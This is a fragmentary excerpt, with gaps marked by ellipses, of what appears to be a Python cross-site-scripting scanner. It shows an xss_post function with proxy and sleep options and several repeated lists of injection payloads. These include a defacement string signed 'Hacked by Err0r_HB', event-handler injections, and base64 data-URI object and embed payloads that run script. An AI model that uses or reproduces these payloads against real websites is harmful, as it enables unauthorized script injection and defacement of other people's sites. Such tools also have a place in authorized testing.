...
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
			...
			payloads=['"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>TechViper','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			x = 0
...
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
	...
	def xss_post(self,url,co,tim,dat,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		...
		if ok:
			...
			x = 0
			payloads=['"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>TechViper','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src=x onerror=alert(1)>","'><img src=x onerror=alert(1)>"]
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
...
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
			...
			payloads=["'><img src=x onerror=alert(1)>",'"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>TechViper','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			x = 0
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
